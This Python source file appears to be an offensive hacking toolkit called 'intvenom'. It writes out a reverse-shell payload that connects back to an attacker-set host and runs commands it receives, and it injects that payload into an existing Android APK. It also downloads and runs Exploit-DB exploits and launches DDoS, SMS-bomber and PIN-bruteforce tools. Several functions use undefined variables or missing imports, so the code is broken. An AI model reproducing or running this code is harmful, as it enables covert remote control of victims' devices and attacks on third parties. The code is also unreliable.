import argparse
import os
import requests
from bs4 import BeautifulSoup
import subprocess
import shutil
import re
from colorama import Fore, init
import socket
import os
import argparse
import zipfile
import shutil

def main():
   print("""
   ⠀⠀⢀⠤⠒⠒⠀⠒⠂⢄⡀⠀⠀⠀⠀⠀⠀
⠀⡜⢀⠀⠀⠀⠀⠀⠀⢀⡈⢆⠀⠀⠀⠀⠀
⠸⠀⠃⡄⠀⠀⠀⠀⠀⡸⢱⠀_ _ _ ___ _ _ ____ _ _ ____ _ _
⡇⢸⠀⠀⠄⠀⠀⠀⠜⠀⠀⠂⠄| |\ | | | | |___ |\ | | | |\/|⠀⠀⠀
⠇⢨⠀⠀⠈⢚⠸⠂⠀⠀⠀⡄⡄| | \| | \/ |___ | \| |__| |⠀⠀⠀⠀
⠐⢆⢂⠀⠀⠈⠀⠢⢀⣀⢎⡄⠀⠀⠀⡀⠀
⠰⡘⣷⢶⣿⣾⣧⣿⣶⠶⡻⣠⠃⠀⠀⠘⡄
⠀⠑⣿⣄⣿⠾⠷⡟⠥⡴⠡⠃⠀⠀⢀⠔⡀
⠀⠀⠘⢟⣷⣠⣄⡀⠀⠈⢇⠠⠂⠉⡠⠄⠀
⠀⠀⠀⠘⠻⣿⠶⡟⣄⡀⠀⠀⢀⠎⠀⠀⠀
⠀⠀⠀⠀⠑⠤⠠⠤⠃⠀⠉⠉⠀⠀
    """)
   global parser
   parser = argparse.ArgumentParser(prog="intvenom", description="intvenom [options]")
   parser.add_argument("start", nargs='?', help="intconsole Starter")
   parser.add_argument("use", nargs='?', help="Exploit using command")
   parser.add_argument("add", nargs='?', help="add a code")
   parser.add_argument("LHOST", nargs='?', help="set a LHOST")
   parser.add_argument("LPORT", nargs='?', help="set a LPORT")
   parser.add_argument("-e", "--exploit", required=False, help="search exploit payload's")
   parser.add_argument("-f", "--format", required=False, help="formatting")
   parser.add_argument("-p", "--payload", required=False, help="occuring payload")
   parser.add_argument("-o", "--output", required=False, help="set output")
   parser.add_argument("-t", "--tools", required=False, help="Installing Tools")
   parser.add_argument('-v', '--version', required=False, action='store_true', help="see version")
   parser.add_argument("--original-apk", required=False, help="Path to the original APK file")
   parser.add_argument("--output-apk", required=False, help="Path for the output APK file")
   args = parser.parse_args()

main()

def create_payload(lhost, lport, output):
    payload_content = f"""
import socket
import os
import subprocess

def get_ip():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

def connect_back(lhost, lport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    ip = get_ip()
    s.send(ip.encode('utf-8'))
    while True:
        command = s.recv(4096).decode('utf-8')
        if command.lower() == "exit":
            break
        elif command.startswith("cd "):
            try:
                os.chdir(command[3:])
                s.send(b"Changed directory")
            except FileNotFoundError as e:
                s.send(str(e).encode('utf-8'))
        elif command == "camera":
            # Kamera erişim kodu buraya eklenecek
            s.send(b"Camera access is not implemented")
        else:
            output = subprocess.getoutput(command)
            s.send(output.encode('utf-8'))
    s.close()

if __name__ == "__main__":
    lhost = "{lhost}"
    lport = {lport}
    connect_back(lhost, lport)
"""
    with open(output, 'w') as payload_file:
        payload_file.write(payload_content)
    print(f"Payload created and saved as {output}")

def create_apk_with_payload(original_apk, payload_file, output_apk):
    temp_dir = "temp_apk"

    with zipfile.ZipFile(original_apk, 'r') as zip_ref:
        zip_ref.extractall(temp_dir)
    
    assets_dir = os.path.join(temp_dir, 'assets')
    if not os.path.exists(assets_dir):
        os.makedirs(assets_dir)
    shutil.copy(payload_file, os.path.join(assets_dir, 'payload.py'))

    with zipfile.ZipFile(output_apk, 'w') as new_zip:
        for folder_name, subfolders, filenames in os.walk(temp_dir):
            for filename in filenames:
                file_path = os.path.join(folder_name, filename)
                arcname = os.path.relpath(file_path, temp_dir)
                new_zip.write(file_path, arcname)
    
    shutil.rmtree(temp_dir)
    print(f"Payload injected and new APK saved as {output_apk}")
    

# Payload araştırma ve indirme fonksiyonu
def search_and_download_payload(payload):
    try:
        # Exploit-DB'de arama yap
        search_url = f"https://www.exploit-db.com/search?q={payload}"
        response = requests.get(search_url)
        
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            exploit_link = soup.select_one('.exploitdb_results tbody tr:nth-child(1) td:nth-child(2) a')
            
            if exploit_link:
                exploit_name = exploit_link.text.strip()
                exploit_url = exploit_link['href']
                print(f"\n[+] Bulunan exploit: {exploit_name}")
                
                # Exploit'i indir
                download_url = f"https://www.exploit-db.com{exploit_url}"
                response = requests.get(download_url)
                
                if response.status_code == 200:
                    # Dosyayı geçici bir klasöre kaydet
                    exploit_file_name = f"{exploit_name}.txt"
                    temp_folder = "temp_exploits"
                    if not os.path.exists(temp_folder):
                        os.makedirs(temp_folder)
                    
                    temp_file_path = os.path.join(temp_folder, exploit_file_name)
                    
                    with open(temp_file_path, 'wb') as file:
                        file.write(response.content)
                    
                    print(f"[+] {exploit_name} başarıyla indirildi: {temp_file_path}")
                    
                    # Exploit dosyasının içeriğinde zararlı kod kontrolü yap
                    if check_malicious_code(temp_file_path):
                        print("[!] Exploit dosyasında zararlı kod algılandı. İşlem durduruldu.")
                        return temp_file_path, False
                    
                    return temp_file_path, True
                else:
                    print("[!] Exploit indirilirken bir hata oluştu.")
                    return None, False
            else:
                print("[!] Aranan payload Exploit-DB'de bulunamadı.")
                return None, False
        else:
            print("[!] Exploit-DB'ye bağlanırken bir hata oluştu.")
            return None, False
    except Exception as e:
        print(f"[!] Bir hata oluştu: {str(e)}")
        return None, False

# Exploit dosyasında zararlı kod kontrolü yapan fonksiyon
def check_malicious_code(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            content = file.read()
            # Örnek bir zararlı kod deseni ekleme
            if re.search(r'eval\(base64_decode\(', content):
                return True
            # Başka zararlı kod desenleri ekleyebilirsiniz
        return False
    except Exception as e:
        print(f"[!] Zararlı kod kontrolünde bir hata oluştu: {str(e)}")
        return True

# Komutu çalıştıran fonksiyon
def execute_command(command):
    try:
        # Komutu terminalde çalıştır
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Komut çalıştırılırken bir hata oluştu: {str(e)}")
args = parser.parse_args()
if args.start:
    os.system("intconsole") or os.system("python3 intconsoleV2.py")

def get_version():
    url = "https://raw.githubusercontent.com/Intikam21kurucu/intframework/Intikam21kurucu-patch-1/version.md"
    response = requests.get(url)
    if response.status_code == 200:
        return response.text
    else:
        return "Failed to fetch version information."

if args.version:
    print(get_version())
def lr():
		time.sleep(1)
		print("termux [y] kali [n]")
		k = input("Do you using [termux/kali] ?")
		if k == "y" or "Y" or "termux" or "Termux" or "TERMUX":
			os.system("pkg update -y && pkg upgrade -y && apt update -y && apt upgrade -y")
			os.system("pkg install wget -y")
			os.system("wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh")
			os.system("chmod +x metasploit.sh")
			os.system("./metasploit.sh")
		elif k == "n" or "N" or "kali" or "Kali" or "KALİ":
			os.system("sudo apt-get install metasploit-framework")
			os.system("msfconsole")

# Tool çalıştırma fonksiyonu
def run_tool(tool_number):
    tools = {
        "1": "python3 DDOS.py",
        "2": "python3 SMSBOMBER.py",
        "3": "python3 DISCORD.py",
        "5": """
        git clone https://github.com/Intikam21kurucu/Intikam21
        cd Intikam21
        python3 Intikam21.py""",
        "4": "lr()",
        "6": "python3 iptracker.py",
        "7": """
        git clone https://github.com/in4osecurity/Youtube-Hack
        cd Youtube-Hack
        bash kurulum.sh""",
        "8": "python3 sendemail.py",
        "9": "python3 OSINT.py",
        "10": """
        git clone https://github.com/urbanadventurer/Android-PIN-Bruteforce
        cd Android-PIN-Bruteforce
        ./android-pin-bruteforce crack --length 6
        """,
        "11": """
        git clone https://github.com/Antu7/python-bruteForce
        cd python-bruteForce
        pip install requests
        python3 bruteforce.py
        """,
        "12": {
            "termux": """
            cd ~
            rm -rf intframework
            git clone https://github.com/Intikam21kurucu/intframework
            cd intframework
            chmod +x terbuild.sh
            ./terbuild.sh
            """,
            "kali": """
            cd ~
            rm -rf intframework
            git clone https://github.com/Intikam21kurucu/intframework
            cd intframework
            chmod +x start_kali.sh
            ./start_kali.sh
            """
        },
        "13": "python3 +90wifitools.py"
    }
    command = tools.get(tool_number)
    if command:
        print(f"[+] Tool {tool_number} çalıştırılıyor: {command}")
        execute_command(command)
    else:
        print(f"[!] Tool {tool_number} bulunamadı.")
def runpy():
    init(autoreset=True)
    print(Fore.BLUE + "")
    print("[+] Exploit araştırma ve kullanma işlemi başlatılıyor...\n")
    
    
def payloads():
    global yol
    yol = args.payload
def LHOST():
    global lhost
    lhost = args.LHOST
def LPORT():
	global lport
	lport = args.LPORT
def output():
	global output
	output = args.o
def format():
    try:
        # Dosyayı oku
        with open(file_path, 'r', encoding='utf-8') as file:
            content = file.read()

        # Formatı kontrol et ve işle
        if file_format == 'txt':
            formatted_content = content  # Metin formatı için direkt içeriği al
        elif file_format == 'json':
            try:
                json.loads(content)  # JSON formatını doğrula
                formatted_content = content  # JSON ise içeriği direkt al
            except ValueError as e:
                print(f"[-] JSON formatı geçersiz: {e}")
                return
        else:
            raise ValueError("Geçersiz dosya formatı!")

        # Soket oluştur
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Sunucuya bağlan
        client_socket.connect((args.LHOST, args.LPORT))

        # Dosya içeriğini gönder
        client_socket.sendall(formatted_content.encode('utf-8'))

        print(f"[+] Sended to '{args.LHOST}:{args.LPORT}' ")
    except Exception as e:
        print(f"[-] Hata oluştu: {e}")

    finally:
        # Soketi kapat
        client_socket.close()
    	
    	
    
args = parser.parse_args()    
if args.exploit:
   runpy()
   payload_path, is_safe = search_and_download_payload(args.payload)
   if payload_path and is_safe and args.use:
        # Use komutunu çalıştır
        use_command = f"{args.use} {payload_path}"
        print(f"[+] Use komutu çalıştırılıyor: {use_command}")
        execute_command(use_command)
    
if args.add:
	print(f"[+] Add komutu çalıştırılıyor: {args.add}")
	# Add işlemini burada tanımlayabilirsiniz

if args.tools:
    	# Tools kurulum işlemi burada yapılacak
    	run_tool(args.tools)
if args.LHOST and args.LPORT and  original_apk and output_apk:
    Lhost = args.LHOST.split('=')[1].split()[0]
    Lport = args.LPORT.split('=')[1].split()[0]
    create_payload(Lhost, Lport, output_payload)
    create_apk_with_payload(args.original_apk, output_payload, args.output_apk)

    os.remove(output_payload)
if args.LHOST:
	Lhost = args.LHOST.split('=')[1].split()[0]
if args.LPORT:
	Lport = args.LPORT.split('=')[1].split()[0]
if args.format:
	format()